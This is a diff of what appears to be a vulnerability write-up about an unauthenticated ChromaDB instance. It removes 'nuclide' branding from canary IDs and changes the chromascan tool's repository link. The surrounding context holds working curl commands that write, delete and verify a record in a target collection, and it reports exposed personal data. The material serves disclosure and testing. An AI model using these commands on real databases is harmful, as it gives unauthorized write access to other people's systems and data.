@@ -79,12 +79,12 @@ PII-positive collections: 22 of 35 -- email addresses and personal names confirm
 | Write record | 201 | POST /api/v2/.../collections/{id}/add |
 | Delete record | {"deleted": null} | POST /api/v2/.../collections/{id}/delete |
 
-**Canary UUID:** `nuclide-canary-2026`
+**Canary UUID:** `-canary-2026`
 **Target collection:** `probe-base-1780358607019010200` (ID: 051f6bdb-38fd-42c8-8ece-ff2538c2df78)
 
 Write confirmed: POST /add with 3-dim zero vector returned HTTP 201. (Probe collection has no fixed dimension -- accepts any.)
-Delete confirmed: POST /delete {"ids":["nuclide-canary-2026"]} returned {"deleted": null}. This is a ChromaDB v1.0.0 quirk: null is returned on successful delete when the record has not yet flushed from the write-ahead log. The record is absent on subsequent get.
-Verify confirmed: POST /get {"ids":["nuclide-canary-2026"]} returned {"ids": [], "documents": []} -- confirmed absent.
+Delete confirmed: POST /delete {"ids":["-canary-2026"]} returned {"deleted": null}. This is a ChromaDB v1.0.0 quirk: null is returned on successful delete when the record has not yet flushed from the write-ahead log. The record is absent on subsequent get.
+Verify confirmed: POST /get {"ids":["-canary-2026"]} returned {"ids": [], "documents": []} -- confirmed absent.
 
 ---
 
@@ -108,21 +108,21 @@ PROBE_ID="051f6bdb-38fd-42c8-8ece-ff2538c2df78"
 curl -s -X POST "$BASE/collections/$PROBE_ID/add" \
   -H "Content-Type: application/json" \
   -d '{
-    "ids": ["nuclide-canary-2026"],
+    "ids": ["-canary-2026"],
     "embeddings": [[0.0, 0.0, 0.0]],
-    "documents": ["nuclide canary -- proof of write"],
-    "metadatas": [{"source": "nuclide-research"}]
+    "documents": [" canary -- proof of write"],
+    "metadatas": [{"source": ""}]
   }'
 
 # DELETE -- remove canary
 curl -s -X POST "$BASE/collections/$PROBE_ID/delete" \
   -H "Content-Type: application/json" \
-  -d '{"ids": ["nuclide-canary-2026"]}' | jq .
+  -d '{"ids": ["-canary-2026"]}' | jq .
 
 # VERIFY -- confirm deletion
 curl -s -X POST "$BASE/collections/$PROBE_ID/get" \
   -H "Content-Type: application/json" \
-  -d '{"ids": ["nuclide-canary-2026"]}' | jq .ids
+  -d '{"ids": ["-canary-2026"]}' | jq .ids
 # Expected: []
 ```
 
@@ -162,4 +162,4 @@ Write access to any tenant's job_embeddings collection allows injection of fraud
 ## Tool Reference
 
 **chromascan** -- unauthenticated ChromaDB enumeration + canary write/delete verification
-https://github.com/nuclide-research/chromascan
+https://github.com/sshpie/chromascan
